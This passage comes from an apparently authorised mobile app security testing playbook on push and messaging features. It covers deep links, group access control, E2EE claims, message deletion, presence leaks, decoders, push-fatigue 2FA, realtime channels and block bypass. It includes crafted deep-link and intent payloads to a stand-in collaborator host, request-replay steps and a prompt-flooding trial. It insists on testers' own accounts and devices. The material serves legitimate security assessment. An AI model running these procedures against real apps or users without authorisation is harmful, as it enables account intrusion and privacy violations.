frida -D "$SERIAL" -n "$PKG" -l frida/03-deeplink-trace.js -q -t 300 | tee "$E/logs/D24-041.txt" &
# A → B: targetapp://web?url=https://zq7x4mk9.collab.example/  and  intent://x#Intent;scheme=targetapp;package=$PKG;S.url=https://zq7x4mk9.collab.example/;end  — tap on B's device
```
- **Proof:** The trace shows the route handled in-app (not handed to the system browser) and the collab
  host hit from the app's WebView or the activity started.
- **Escalation:** → D09 route items and D10-004; → D09-063 when the link is `file://` or `content://`.
- **Ruled out when:** Links open in the system browser or a Custom Tab with no scheme special-casing
  (file:line; the trace shows `ACTION_VIEW` to the browser), and `intent:` is refused.

### D24-042 · Group membership and admin checks enforced client-side; join links reused after revocation

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (varies); `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) for the add/remove by id |
| **Attacker** | AM-05 — a non-admin member or an ex-member |
| **Applies to** | Group, channel, room and shared-inbox features |
| **Requires** | backend-api, two-accounts |
| **Maps to** | CWE-862; CWE-863; D15-053 (invite-token reuse) |
| **Record** | `logs/D24-042.txt` (the verb × role table); `requests/E-NNN.http` |

- **Skip when:** the product has no group, channel or room feature in the endpoint map — write `n/a — D24-042: no group feature`.
- **Test:** With A as admin and B as member (plus a third account you own), replay every admin verb
  (add, remove, promote, rename, change settings, delete group, read history before join) from B's
  session; then remove B and replay the member verbs (read, send, react); then use a revoked join link.
- **How:** Capture each verb as A; replay with B's session; record status and body diff per verb;
  revoke the invite link as A and open it as the third account.
- **Proof:** A state change or content read with the wrong role, or a join through a revoked link.
- **Escalation:** → D24-036 when an ex-member can still fetch message ids; → D24-044 for retained
  content.
- **Ruled out when:** Every admin verb from B returns a refusal whose body matches a random-group
  request, an ex-member's reads return nothing (diff), and revoked links are rejected.

### D24-043 · End-to-end-encryption claims — key-change warnings suppressed, no verification path, plaintext history in a backup

| | |
|---|---|
| **Severity ceiling** | Medium; High when the "E2EE" history is readable in a cloud or device backup |
| **VRT** | `mobile_security_misconfiguration.auto_backup_allowed_by_default` (P5) for the backup half alone — argue to `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_external_storage` (P4) / `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) with the plaintext shown |
| **Attacker** | AM-09 (the server, for silent key rotation) / AM-11 and AM-10 (the backup set) |
| **Applies to** | Apps that advertise end-to-end encryption for messages or calls |
| **Requires** | two-accounts, device |
| **Maps to** | MASWE-0006; MASTG-TEST-0216; MASTG-TECH-0127; CWE-311; D11-055 (the second plaintext copy) |
| **Record** | `logs/D24-043.txt` (key-change trial; backup listing); `screenshots/D24-043-1.png` |

- **Skip when:** the product makes no end-to-end-encryption claim (store listing, in-app copy, docs) — write `n/a — D24-043: no E2EE claim to test`; the backup half is then D11-055 / D22 only.
- **Test:** Three questions a marketing claim must survive. (a) When B's key changes (reinstall as B),
  does A's client warn, or silently accept the new key the server presented? (b) Is there a user-visible
  verification (safety number, QR) and does it change? (c) Does the message store, or the app's own
  backup, hold the plaintext history where the backup rules or a cloud export expose it?
- **How:**
```bash
grep -rnE 'safety|fingerprint|identityKey|prekey|X3DH|Signal|libsignal|olm|megolm' "$DEC/jadx/sources" | head
grep -B2 -A6 'allowBackup\|fullBackupContent\|dataExtractionRules' "$DEC/apktool/AndroidManifest.xml"; ls "$DEC/apktool/res/xml/" | grep -iE 'backup|extraction'
# reinstall the app as B (new identity key); send from A; record whether A was warned before the message left
# backup half: tools/05-storage-sweep.sh "$PKG" --backup --serial "$SERIAL"  then grep the set for a canary message
```
- **Proof:** A's client sending to the rotated key with no warning (screenshot + the trace), or the
  canary message in plaintext inside the backup set or export.
- **Escalation:** → D11-055 / D22 for the backup rules; → D12 when the key material itself is
  recoverable.
- **Ruled out when:** The key change blocks sending until acknowledged (trial recorded), a verification
  surface exists and changes with the key, and the backup set excludes the message store (the canary is
  absent — listing shown).

### D24-044 · "Delete for everyone" and message edit not enforced server-side — recipients keep content, media stays at the CDN

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) when the deleted object is still fetchable by id; otherwise rated with the product's stated guarantee (`varies`) |
| **Attacker** | AM-05 — the recipient, or anyone with the attachment URL |
| **Applies to** | Messaging features offering unsend, delete-for-everyone, edit or disappearing messages |
| **Requires** | backend-api, two-accounts |
| **Maps to** | CWE-613; D24-037, D24-036 |
| **Record** | `logs/D24-044.txt`; `requests/E-NNN.http` (the re-fetch after deletion) |

- **Skip when:** the product offers no unsend, delete-for-everyone, edit or disappearing-message feature — write `n/a — D24-044: no retraction feature`.
- **Test:** The guarantee is server-side or it is a client hint. After A deletes-for-everyone or edits,
  re-fetch the message by id with B's session and re-fetch the attachment URL; for disappearing messages,
  fetch after the timer. A `200` with the original bytes is the finding.
- **How:** Capture the fetch routes as B; A sends, A deletes / edits / lets expire; B replays the fetch
  and the media URL; diff the bodies against the pre-deletion capture.
- **Proof:** The original content returned after the deletion, edit or expiry, with timestamps.
- **Escalation:** → D24-037 for the media half; → D24-036 when any id works, not only B's.
- **Ruled out when:** The post-deletion fetch returns a tombstone (diff shown) and the media URL fails
  within the stated window; disappearing messages are absent from the API after expiry.

### D24-045 · Presence, typing, read-receipt and last-seen endpoints leak activity to blocked or unrelated users

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies); `broken_access_control.username_enumeration.non_brute_force` (P4) for the existence oracle |
| **Attacker** | AM-05 — a blocked user or a stranger |
| **Applies to** | Messaging features with online status, typing indicators, read receipts or last-seen |
| **Requires** | backend-api, two-accounts |
| **Maps to** | CWE-200; CWE-862; D24-048 (realtime channels) |
| **Record** | `logs/D24-045.txt` (the polled answers over time); `requests/E-NNN.http` |

- **Skip when:** the product exposes no presence, typing, read-receipt or last-seen signal in the UI or the API — write `n/a — D24-045: no activity signals`.
- **Test:** Block A from B; poll B's presence, typing and read state from A's session (REST and the
  realtime channel). Then do the same from a third account that has no relationship with B. Privacy
  settings ("last seen: nobody") are tested the same way: the API answers or it does not.
- **How:** Capture the presence/typing/receipt calls or subscriptions; replay or re-subscribe as A after
  the block and as the stranger; poll over ten minutes while B is active and idle; diff.
- **Proof:** B's activity signal returned to a session B blocked or never met, against B's stated privacy
  setting.
- **Escalation:** → D24-048 when the leak is a realtime channel anyone can subscribe to; → D24-049 for
  the block-bypass class.
- **Ruled out when:** The blocked and stranger sessions receive the same static answer as for a
  non-existent user (diff empty over the window), and the privacy setting changes the API answer.

### D24-046 · Inbound rich payload parsers — stickers, vCards, location pins, voice notes, polls handed to native or third-party decoders

| | |
|---|---|
| **Severity ceiling** | Support standalone; High / Critical through D16 |
| **VRT** | rated on the D16 sink reached — `application_level_denial_of_service_dos.critical_impact_and_or_easy_difficulty` (P2) only for a persistent, remotely triggered crash |
| **Attacker** | AM-05 / AM-01 — a received object |
| **Applies to** | Messaging features that decode received objects with native code or bundled parsers (animated stickers, contact cards, map tiles, audio codecs, custom binary formats) |
| **Requires** | native, device |
| **Maps to** | MASWE-0044; MASWE-0050; D16-036 (0-click paths), D16-024 (size arithmetic), D24-015 (push media as the trigger) |
| **Record** | `logs/D24-046.txt` (the entry-point table: object type → decoder → tap needed?) |

- **Skip when:** `ls "$DEC/apktool/lib/"*/ 2>/dev/null | wc -l` = 0 and every received object type is decoded by platform code (table complete) — write `n/a — D24-046: no app-bundled decoder for received objects`.
- **Test:** For every received object type, name the decoder, whether it runs on receipt or on tap, and
  whether it is the platform's or the app's. The table is the deliverable; a found crash goes to D16
  with the entry point attached. The zero-click column (decoded on receipt for the preview or the
  notification) is the one that changes the multiplier.
- **How:**
```bash
grep -rnE 'System\.loadLibrary\(|Lottie|rlottie|vcard|VCard|opus|ogg|webp|gif|tgs|LottieAnimationView' "$DEC/jadx/sources" | head
ls "$DEC/apktool/lib/"*/ | sort -u                                   # which decoders ship as .so
# for each object type: send one well-formed object from B, trace which library decodes it and when (frida-trace -D "$SERIAL" -n "$PKG" -i 'decode*' or the app's JNI entry)
```
- **Proof:** The entry-point table with the decoder and the trigger context per object type; a crash or
  fault from a malformed object filed under D16 with the input hash.
- **Escalation:** → D16-036 and the D16 bug classes; → D25-036 when the decoder is a vendor library.
- **Ruled out when:** Every received object type is decoded by platform code only (table complete with
  no app-bundled decoder), or app decoders run only on tap with the bounded fuzz recorded (count printed).

### D24-047 · Approval-push (tap-to-approve 2FA) without number matching, with unlimited resends, approvable from the lock screen

| | |
|---|---|
| **Severity ceiling** | High; Critical when the approval completes a login or a transfer from a locked device |
| **VRT** | `broken_authentication_and_session_management.two_fa_bypass` (P3); `insufficient_security_configurability.weak_two_fa_implementation.missing_failsafe` (P5) is where a report without the demonstrated approval lands |
| **Attacker** | AM-01 (push fatigue: the attacker holds the password and triggers prompts); AM-10 (approval from the keyguard) |
| **Applies to** | Apps that approve logins, payments or device enrolments from a notification action |
| **Requires** | push, two-accounts, device |
| **Maps to** | MASWE-0023 (step-up authentication); MASWE-0037; D13-085 (owner of the lock-screen action), D13-066 (channel downgrade), D20-035 (`RemoteInput` on a sensitive notification) |
| **Record** | `logs/D24-047.txt` (resend count and timing; the keyguard trial); `screenshots/D24-047-1.png` |

- **Skip when:** no login, payment or enrolment is approvable from a notification action (`grep -rlE 'addAction\(' "$DEC/jadx/sources"` hits carry no approve/confirm semantics) — write `n/a — D24-047: no approval-push flow`.
- **Test:** Three measurements. (a) Does the prompt show a number or code the user must match to the
  login screen, or is it a bare Approve button? (b) How many prompts can one password-holder trigger per
  minute, and is there a "deny and lock" path? (c) Can the Approve action be fired from the lock screen
  (D13-085) — by the holder of a locked phone, or by a listener via the action's `PendingIntent`
  (D08-040)?
- **How:**
```bash
grep -rnE 'addAction\(|setAllowGeneratedReplies|numberMatch|setAuthenticationRequired\(' "$DEC/jadx/sources" | grep -iE 'approve|login|confirm|auth' | head
# (b) with A's password from a second device, request login N=20 times in 2 minutes; count the prompts delivered (D24-005)
# (c) lock A's device (KEYCODE_SLEEP), trigger a login, tap Approve from the keyguard; then the D20-031 listener firing actions[i].actionIntent
```
- **Proof:** A login or transfer completed by an approval that showed no matching code, after N
  unthrottled prompts, or from the keyguard / a listener's `send()`.
- **Escalation:** → `authentication_bypass` (P1) when the approval is the only second factor and the
  password is the AM-01 precondition; → D13-085, D08-040, D20-035 for the acquisition halves.
- **Ruled out when:** The prompt requires an in-app match code (screenshot), resends are throttled with a
  lockout (count and the 429), and the action carries `setAuthenticationRequired(true)` or opens the app
  behind the keyguard (trial shows the unlock prompt).

### D24-048 · Realtime pub/sub channel subscription not authorised server-side — WebSocket, MQTT or a third-party realtime SDK

| | |
|---|---|
| **Severity ceiling** | Critical when the channel carries messages, OTPs or balances; High for presence and events |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3); `broken_authentication_and_session_management.authentication_bypass` (P1) when a delivered value authenticates |
| **Attacker** | AM-05 — any authenticated client; AM-01 when the channel auth endpoint takes no session |
| **Applies to** | Apps using a persistent realtime channel for chat, presence or live updates (WebSocket, MQTT, SSE, a hosted pub/sub SDK) whose channel names embed a user, room or order id. Per-message authorisation on the socket is D14-020; this item owns the subscribe step. |
| **Requires** | backend-api, two-accounts, mitm |
| **Maps to** | CWE-862; CWE-639; D14-020, D15-056 (the push-topic twin) |
| **Record** | `logs/D24-048.txt` (channel names seen; the sibling subscription and what it delivered); `requests/E-NNN.http` |

- **Skip when:** the proxy shows no persistent realtime channel (no WebSocket, MQTT or SSE connection, no pub/sub SDK in `$DEC`) — write `n/a — D24-048: no realtime channel`.
- **Test:** The subscribe frame names the channel; the server either checks that the session may read it
  or it does not. Hosted pub/sub SDKs push this check into a "channel auth" endpoint the app calls — read
  that endpoint's inputs (does the client name the channel, and does the server sign whatever it is
  asked?). Then subscribe to a sibling channel built from B's id and wait.
- **How:**
```bash
grep -rnE 'subscribe\(|private-|presence-|channel|topic|mqtt|wss?://' "$DEC/jadx/sources" | grep -viE 'firebase' | head -30
# proxy / WebSocket view: capture the subscribe frame and the auth call as A; replay with B's channel name (user_<B>, room_<B's room>); keep the socket open while B acts
```
- **Proof:** B's canary content or events arriving on A's socket after the sibling subscription, with the
  frames.
- **Escalation:** → `authentication_bypass` when the channel carries an OTP or approval; → D14-020 for
  per-message checks on a channel the client legitimately holds; → D24-045 for the presence leak.
- **Ruled out when:** The auth endpoint derives the channel from the session (your named channel is
  replaced or refused — diff), and the sibling subscription receives nothing while B is active.

### D24-049 · Block, mute and privacy settings bypassable through an alternate route — reply, reaction, group, call or mention

| | |
|---|---|
| **Severity ceiling** | Medium; High when the bypass delivers content to the victim's drawer |
| **VRT** | `broken_access_control.privilege_escalation` (varies) — the product's own stated control is the boundary |
| **Attacker** | AM-05 — the blocked user |
| **Applies to** | Messaging features with block, mute, "message requests" or "who can message me" settings |
| **Requires** | backend-api, two-accounts |
| **Maps to** | CWE-863; CWE-284; D24-045, D24-011 |
| **Record** | `logs/D24-049.txt` (the route × setting table); `requests/E-NNN.http`; `screenshots/D24-049-1.png` |

- **Skip when:** the product has no block, mute or message-request setting — write `n/a — D24-049: no block feature`.
- **Test:** B blocks A. Enumerate every route by which A can still cause something to appear on B's
  device: reply in a shared group, react to B's message, mention B, forward a message to B, start a call,
  invite B to a group, send a payment request, edit an old message in a shared thread. Each is a cell;
  the ones that end in a push to B are the ones that pay.
- **How:** With the block in place, replay each route from A's session (counted, D24-005); watch B's
  drawer and B's API responses.
- **Proof:** Content from the blocked account rendered on B's device or returned in B's API, with the
  route.
- **Escalation:** → D24-011 when the bypass route also carries free text; → D24-045 for presence.
- **Ruled out when:** Every route returns a refusal consistent with the block (diff against an unblocked
  third account) and B's drawer shows nothing during the sweep.

### D24-050 · The push and messaging graveyard — what is not a finding, with the policy sentence that says so

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.data_traffic_spam` (P5); `insufficient_security_configurability.lack_of_notification_email` (P5) — the two nodes a transport-only report lands on |
| **Attacker** | AM-01 |
| **Applies to** | Every candidate in this chapter before D24-006 passes it |
| **Requires** | — |
| **Maps to** | `docs/02-severity-and-reportability.md`; `docs/06-triage-playbook.md`; the Graveyard table of this chapter |
| **Record** | `logs/D24-050.txt` (one line per killed candidate quoting the policy or the taxonomy node) |

- **Test:** Carrier and RCS verified-sender spoofing is the carrier's bug; the push provider's visibility
  of payloads is its trust model; "push is not end-to-end encrypted" is the same; notification spam
  without an authorisation bypass and a one-off crash from a payload are both P5. Each gets a line in the
  decision log quoting the node or the programme's exclusion text, so the next session does not re-walk
  it.
- **How:** For each killed candidate: `D24-NNN <candidate> KILLED — <node or quoted policy sentence> —
  would become a finding if <the Graveyard column 3 condition>`.
- **Proof:** The line exists; the candidate is in `report/assessment-status.md` under RULED OUT with the
  same text.
- **Escalation:** n/a — the column-3 condition is the escalation, item by item.
- **Ruled out when:** Not applicable; a killed candidate without the quoted sentence is an opinion, not a
  ruled-out entry.

### D24-051 · PoC standard for this chapter — own tokens, own accounts, the two-device recording, the victim's content redacted

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — evidence standard |
| **Attacker** | AM-01 |
| **Applies to** | Every finding filed from this chapter |
| **Requires** | — |
| **Maps to** | `docs/04-poc-and-evidence-standard.md`; D27-031 (the canary rule); D20-002 (markers) |
| **Record** | `pocs/F-NNN/` (the recording, the request pair, the probe manifest where AM-03 applies); `logs/D24-051.txt` (the checklist below, ticked) |

- **Test:** A push or messaging PoC touches two principals by construction, so the standard is strict:
  sends go only to tokens, topics and accounts you own; never to a segment, "all users", a `condition`
  expression or a third party's number; a leaked send credential is proved with one benign message to
  your own device and then reported, not reused. The recording shows both devices in one take — the
  sender's request (or the attacker app's log) and the victim device's drawer or screen — with the canary
  text visible and any real content redacted; the negative control (the same payload on the hardened
  path, or before the subscription) is in the same take.
- **How:** Checklist per finding: own-principals statement · canary text in the payload · both devices
  in frame (or the attacker-app log beside the victim screen) · the request or send in `requests/` ·
  the negative control · the D24-006 severity line · the redaction pass.
- **Proof:** `pocs/F-NNN/` contains the recording, the request pair and the ticked checklist.
- **Escalation:** n/a — this is what lets D24-010, D24-017 and D24-036 be accepted at their ceiling.
- **Ruled out when:** Not applicable; a finding without the own-principals statement is not filed.

### D24-052 · Chain-filing order — the push or messaging primitive first, then the consumer, with cross-references

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — reporting discipline |
| **Attacker** | AM-01 |
| **Applies to** | Every chain whose delivery clause is a push, a notification or a message |
| **Requires** | — |
| **Maps to** | `docs/06-triage-playbook.md`; D27-016 (rate by acquisition path), D27-024 (the attack-scenario column) |
| **Record** | `logs/D24-052.txt` (the filing order and the report ids once assigned) |

- **Test:** File the delivery primitive (D24-010 topic, D24-011 free-text route, D24-017 credential,
  D24-019 SDK component, D24-048 channel) as its own report with its own node, then file the consumer
  (D09 route, D10 WebView, D13 OTP, D15 IDOR) referencing it. One report that bundles both is rated on
  whichever half the triager understands least; two reports with cross-references are rated on each.
- **How:** Write the primitive's report with the attack-scenario sentence ending at delivery; write the
  consumer's report with "delivery via <primitive report>" as its precondition line; backfill the ids.
- **Proof:** Two report drafts under `report/` with mutual references and the D24-006 line in each.
- **Escalation:** n/a — this is the escalation mechanism for the chapter.
- **Ruled out when:** Not applicable; a chain filed as one report is a rating choice the triager makes
  for you.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| The push provider (or its dashboard) can read notification payloads | The provider is the app's trusted delivery infrastructure; "the vendor sees the data it delivers" is its documented trust model, and no programme rates a third party's design as the app's bug. | The payload carries a value the app's own policy says never leaves the backend (an OTP, a card number) **and** a reader the app does not control sees it on the device (D24-012) — rate on the reader, not on the provider. |
| "Push messages are not end-to-end encrypted" | Same trust model; the transport is TLS to the provider and TLS to the device. | A sensitive value in the payload reaches history, a listener or the keyguard (D24-012), or a cleartext fetch of rich media exists (D24-015). |
| A route lets one user send many notifications to another | `sensitive_data_exposure.disclosure_of_secrets.data_traffic_spam` is P5. | The same route takes free text or a deep link (D24-011), reaches a blocked user (D24-049), or has no throttle on an SMS send that costs the vendor money (D13-047 — the `sms_triggering` node is P4). |
| The handler crashes on a malformed payload | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` is P5; a crash alone is excluded by most programmes. | The crash persists across restart (the message is re-delivered on every launch), or the input reaches a decoder with a memory-safety sink (D24-015, D24-046 → D16). |
| The app's push receiver is `exported="true"` | The provider's receive action is a protected delivery contract guarded by a signature permission; the export is required. | The signature permission is missing or the messaging service is exported (D05-025 oracle: the unrooted probe's send is not refused). |
| The legacy server key is in the APK but the legacy send endpoint rejects it | The provider retired the legacy HTTP API; a 401 there proves the endpoint is closed, not that the credential is harmless. | The same project's service-account JSON is in the package (D18-032), or a vendor REST credential sends (D24-017). |
| The client subscribes to topics | Topic subscription is the provider's documented feature. | The topic name is derived from a user, order or tenant id and a sibling subscription delivers another user's content (D24-010). |
| Notifications show full content on the lock screen | The user chose `VISIBILITY_PUBLIC` in Settings, or the app's default is public for a non-sensitive channel. | The channel carries an OTP, balance or message body with `VISIBILITY_PUBLIC` as the app's default and no `setPublicVersion` (D20-030), or the payload picks the public channel (D24-026). |
| A notification listener can read the app's notifications | The listener grant is a user decision; every app's notifications are readable by a granted listener. | The app puts a secret or a one-time token in the extras (D24-012, D24-031), ships a `content://` URI the listener gains a grant on (D24-025), or exposes an approval action (D24-047). |
| "The app has no `POST_NOTIFICATIONS` runtime prompt" / the user can decline alerts | A platform permission model, not an app defect. | Security alerts have no other delivery channel and the takeover becomes silent (D22-019), or the app uses a call-style exemption to post anyway (D22-020). |
| SMS OTP is sent in plaintext over the carrier network | Carrier transport is out of scope everywhere; SMS is the user's chosen factor. | The app reads more than the OTP (D24-034), or the OTP is reachable on the device by a weaker principal (D13-048). |
| Carrier or RCS verified-sender spoofing | A carrier and messaging-platform problem; the app did not write the sender badge. | The app's own business-messaging backend lets the client choose the sender identity (D24-035). |
| A received link opens in the system browser | That is the safe behaviour. | The link is handled in-app as a deep link or in the session WebView without the browser path's checks (D24-041). |
| A received image is saved to the gallery | Expected for a messaging app the user configured to auto-save. | EXIF location survives, or the file lands in a collection other apps read without the user's export choice (D24-039). |
| Message ids are UUIDs, so the IDOR is "AC:H" | The HackerOne standard does set `AC:H` on an unleaked v4 UUID. | The id leaks elsewhere (D15-039, D15-058) — then the same bug is two VRT bands higher. |
| The self-sent canary from the root harness reached the handler | A root broadcast (D24-004 harness) bypasses the signature permission; it proves what the handler does, not who can reach it. | The same payload is delivered through a route in the D24-003 table, a recovered credential (D24-017), a topic (D24-010) or an exported SDK component (D24-019). |
| Reproduced only with the client's recovered send credential against the tester's own device | That is the D24-017 proof, correctly bounded. Sending to anyone else, a segment or a topic is a programme violation, not evidence. | Nothing — stop at the benign own-device send and file. |

## Cross-surface joins

- **D05 ordered-broadcast interception × D13 OTP pipeline × D24 push.** On API <= 35, intercept the
  ordered broadcast carrying the code (D05-036), `abortBroadcast()` the fraud alert that would have warned
  the user, and replay the code — three surfaces owned by three different reviewers, and the chain is a
  2FA bypass with a suppressed alarm. The D24 half is the alert's delivery: a notification the victim never
  saw (D22-019 makes it silent on a fresh install anyway).
- **D08 × D24 — the notification drawer is the PendingIntent acquisition layer.** The PendingIntent
  reviewer reads the builder (D08-037, D08-044); the notification reviewer reads the content. The join is a
  `NotificationListenerService` that harvests `contentIntent` / `actions[i].actionIntent` and re-sends
  them (D08-040): a mutable PendingIntent built from a payload field (D24-020) becomes a confused deputy
  with a working acquisition path, and an approval action (D24-047) becomes an approval the listener can
  fire.
- **D09 × D24 — the notification-trust routes.** Routes gated on "this came from a notification" are
  gated on a signature whose key is often in the APK (D09-039), so a push-origin route is trusted more than
  the same URI from a browser (D24-013). Joined the other way, a listener reads the deep link **and its
  one-time token** out of the extras and replays the route itself (D24-031). The push team and the router
  team each assume the other validates.
- **D13 × D24 — the OTP pipeline and listener redaction.** D13-048 tests the four on-device OTP readers;
  Android 15 redacts one of them for one content class. D24 adds the delivery shapes that route around
  it — the OTP in a push payload rather than an SMS (D24-012), on a public channel chosen by the sender
  (D24-026), on a companion (D24-024), in a topic any install can subscribe to (D24-010) — and the
  approval prompt that replaces the OTP altogether (D24-047). Settle the OTP question with both chapters
  open.
- **D15 × D24 — push payload × backend action.** A data message that names an object id turns the
  victim's client into the attacker's HTTP client with the victim's session (D24-016); the backend IDOR
  (D15) and the client's trust in the payload are two halves of one report, filed per D24-052. The
  registration and topic routes (D15-055, D15-056) are the backend statements whose on-device proof lives
  here (D24-007, D24-010).
- **D20 × D24 — sensitive content in notifications.** D20-030..035 settle what the drawer shows and to
  whom; D24 settles what the sender can put there and which reader sees it: the payload value (D24-012),
  the channel the payload selects (D24-026), the promoted surface on the always-on display (D24-023), the
  companion (D24-024). One canary OTP, posted once, answers both chapters if each reader is checked in the
  same trial.
- **D16 × D24 — zero-click delivery.** A push's big-picture URL (D24-015), a received sticker or voice
  note (D24-046) and an MMS part under the SMS role (D24-033) each reach a decoder in the app's process
  with no tap. The native reviewer finds the bug; this chapter names the trigger context, which is what
  decides the multiplier.
- **D23 × D24 — entitlement refresh by push.** Entitlement state refreshed by a push-triggered broadcast
  or data message (D23-017) is assertable by whoever can send the message (D24-003) and repeatable when
  the handler does not dedupe (D24-021).
- **D11 × D24 — media and message stores.** Received media in shared collections (D24-039) is the D11
  MediaStore question with a remote sender choosing the bytes and, through D11-045, the filename; the
  message store in a backup set (D24-043) is D11-055's second plaintext copy.

## Sources

- OWASP MASTG/MASVS/MASWE: MASTG-TEST-0315 (sensitive data exposed via notifications), -0318 and -0319
  (SDK APIs handling sensitive data), -0381 (insecure PendingIntent creation), -0394 (custom URL scheme
  input validation), -0398 and -0400 (WebViewClient URL loading handlers), -0200 (files written to
  external storage), -0216 (backup exclusion), -0235 and -0236 (cleartext), -0366 (exported receivers);
  MASTG-TECH-0043, -0162, -0164, -0172, -0173, -0127; MASTG-KNOW-0054 (app notifications), -0024
  (pending intents), -0019 (deep links), -0018 (WebViews), -0026 (third-party services), -0138 (URI
  schemes in intent results); MASTG-BEST-0063, -0071, -0035; MASTG-DEMO-0078, -0147, -0130;
  MASTG-TOOL-0031 (Frida), -0097 (mitmproxy), -0125 (apkleaks); rules
  `mastg-android-sensitive-data-in-notifications`, `mastg-android-pendingintent-mutable`,
  `mastg-android-deeplink-unvalidated-parameter`; MASWE-0004, -0006, -0018, -0023, -0024, -0026, -0029,
  -0032, -0033, -0035, -0036, -0037, -0044, -0050, -0069, -0073; MASVS-PLATFORM-1/2/3, MASVS-AUTH-1,
  MASVS-NETWORK-1, MASVS-PRIVACY-1, MASVS-CODE-4.
- Android platform documentation: `develop/ui/views/notifications` (channels, visibility,
  `setPublicVersion`, `setLocalOnly`, `MessagingStyle`, full-screen intents, call style), the Android 11
  notification history, Android 12 notification-trampoline restriction, Android 13 `POST_NOTIFICATIONS`
  and dismissable foreground-service notifications, Android 14 `USE_FULL_SCREEN_INTENT` restriction,
  Android 15 sensitive-notification (OTP) redaction for untrusted listeners and Private Space, Android 16
  Live Updates (`Notification.ProgressStyle`, promoted ongoing notifications — verify names on the
  installed platform); `reference/android/service/notification/NotificationListenerService`;
  `reference/android/telephony/SmsManager`; the default-SMS-app contract (`SMS_DELIVER`,
  `WAP_PUSH_DELIVER`, `RESPOND_VIA_MESSAGE`); `guide/topics/manifest/receiver-element`
  (`android:directBootAware`); the risk articles `insecure-broadcast-receiver`, `pending-intent`,
  `intent-redirection`, `unsafe-deep-link`.
- Push provider documentation: the messaging SDK's distinction between notification messages (posted by
  the SDK when the app is backgrounded; data keys delivered as launcher-activity extras) and data messages
  (always handed to the handler); topic subscription as a client call; the retirement of the legacy
  server-key HTTP API in favour of the OAuth2 HTTP v1 API with service-account credentials; the
  `c2dm.permission.SEND` signature permission on the receive receiver; at-least-once delivery and
  collapse keys. Engagement-SDK documentation for each vendor present: which identifier is client-safe
  and which credential is server-only.
- Bugcrowd VRT release 2026-07-08: `broken_access_control.idor.*`, `.privilege_escalation`,
  `.username_enumeration.non_brute_force`; `broken_authentication_and_session_management.authentication_bypass`,
  `.two_fa_bypass`, `.failure_to_invalidate_session.on_logout`;
  `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset`, `.pii_leakage_exposure`,
  `.data_traffic_spam` (P5), `.pay_per_use_abuse`; `cross_site_scripting_xss.stored.non_admin_to_anyone`;
  `server_security_misconfiguration.server_side_request_forgery_ssrf.*`,
  `.no_rate_limiting_on_form.sms_triggering`; `server_side_injection.content_spoofing.*`;
  `insufficient_security_configurability.lack_of_notification_email` (P5),
  `.weak_two_fa_implementation.missing_failsafe`; `application_level_denial_of_service_dos.app_crash.malformed_android_intents` (P5);
  `mobile_security_misconfiguration.auto_backup_allowed_by_default` (P5);
  `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_external_storage`;
  `sensitive_data_exposure.exif_geolocation_data_not_stripped_from_uploaded_images.*`.
- MITRE ATT&CK Mobile: T1517 Access Notifications; T1582 SMS Control; T1636.004 SMS Messages; T1660
  Phishing; T1655 Masquerading; T1643 Generate Traffic from Victim; T1635 Steal Application Access Token;
  T1437.001 Web Protocols; T1541 Foreground Persistence; T1624.001 Broadcast Receivers.
- Report classes (no ids cited — see `docs/02`): cross-account message and attachment IDOR in chat
  features; push-token registration accepting another user's identifier; per-user topic subscription;
  stored XSS in message rendering; server-side link-preview SSRF; notification-listener OTP theft as
  banking-trojan tradecraft; vendor REST send credentials in client packages; "delete for everyone"
  unenforced server-side; blocked-user bypass via reactions and groups.
- Tooling: Frida (`frida -D "$SERIAL"`, `frida/01-webview-settings.js`, `frida/02-bridge-enum.js`,
  `frida/03-deeplink-trace.js`), mitmproxy with WebSocket view, `adb shell dumpsys notification
  --noredact`, `adb shell cmd notification post`, `adb shell appops get`, `tools/02-component-sweep.sh`,
  `tools/05-storage-sweep.sh --backup`, the `attacker-app/` probe for AM-03, `exiftool`, a Wear or
  companion emulator, a second AVD or handset for account B.
- Bug-hunting methodology corpus (the layer-ordering trap, the Body-Diff Rule, the Shell-Loop Ban, the
  Pre-Severity Gate, chain-filing order), applied here as D24-004/005/006/052.
